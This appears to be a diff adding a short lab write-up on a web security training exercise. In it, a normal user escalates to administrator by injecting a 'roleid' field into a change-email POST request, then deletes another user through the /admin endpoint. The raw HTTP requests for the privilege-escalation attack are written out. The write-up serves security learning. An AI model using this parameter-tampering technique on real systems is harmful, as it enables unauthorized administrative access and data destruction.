@@ -1,0 +1,30 @@
+Lab 4: User role can be Modified in user Profile
+
+Aim: Delete Carlos by accessing /admin URL from a Normal user Account
+
+Methodology:
+
+- Logged in as wiener:peter
+- Found an Update Email functionality which allows current user to update his mail ID.
+- Captured this request in burp
+- When clicked on Update Email, it sends a post request to /my-account/change-email with the new mail ID in the Body.
+- The server responded with a JSON data which sshowed the updated email and also revealed the roleID of wiener is roleID=1
+
+{
+  "username": "wiener",
+  "email": "wiener@admin-user.net",
+  "apikey": "zEGmWmDaM8AhSVJsRoTX7iCUIX60YKTD",
+  "roleid": 1
+}
+
+- Since it updated email value, tried to also add the roleid in the POST request Body such that the rpoleid gets updated to roleid=2
+
+POST /my-account/change-email HTTP/2
+{
+  "email":"wiener@admin-user.net",
+  "roleid": 2
+}
+
+- Accessed the Admin ung a GET request: GET /admin HTTP/2
+
+- Deleted Carlos: GET /admin/delete?username=carlos HTTP/2
